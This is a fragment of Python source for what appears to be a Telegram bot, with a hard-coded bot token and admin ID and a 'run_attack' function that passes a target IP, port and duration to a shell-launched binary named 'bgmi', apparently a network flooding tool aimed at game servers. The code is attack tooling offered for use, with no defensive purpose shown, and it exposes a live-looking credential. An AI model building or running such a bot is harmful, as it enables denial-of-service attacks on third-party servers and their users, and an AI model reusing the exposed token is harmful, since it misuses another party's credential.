...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '8226453895:AAGF8pUed9vTmc0LwW6blrT6R4fg_BOYobc'
ADMIN_USER_ID = 6535069863  # Replace with your admin user ID
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} {500} 500",
